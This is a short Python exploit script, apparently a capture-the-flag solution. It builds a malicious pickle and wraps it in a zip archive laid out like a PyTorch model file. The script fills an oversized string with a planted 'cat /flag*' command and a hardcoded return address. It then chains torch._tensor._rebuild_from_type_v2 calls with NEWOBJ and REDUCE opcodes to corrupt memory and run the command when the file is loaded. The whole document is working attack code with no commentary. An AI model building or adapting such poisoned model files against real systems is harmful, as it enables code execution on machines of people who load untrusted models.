from pickle import *
import zipfile
import struct
import io

c = b"cat /flag*\x00"
b = b"A"*0x10000
b = b[:1536] + c + b[1536+len(c):]
b = b[:1560] + struct.pack("<Q", 0x4206c0) + b[1568:]

p = PROTO + b"\x02"
p += BINUNICODE + struct.pack("<I", 0x10000) + b
p += NEWOBJ
for i in range(0x30):
    p += GLOBAL + b"torch._tensor\n_rebuild_from_type_v2\n"
for i in range(0x30):
    p += NEWOBJ
p += BININT1 + struct.pack("B", 0x2f)
p += MARK + EMPTY_TUPLE + EMPTY_TUPLE + EMPTY_TUPLE + EMPTY_DICT + TUPLE
p += REDUCE
p += STOP

out = io.BytesIO()
zip = zipfile.ZipFile(out, "a")
zip.writestr("archive/constants.pkl", p)
zip.writestr("archive/.data/version", "1")
zip.close()
print(out.getvalue().hex())
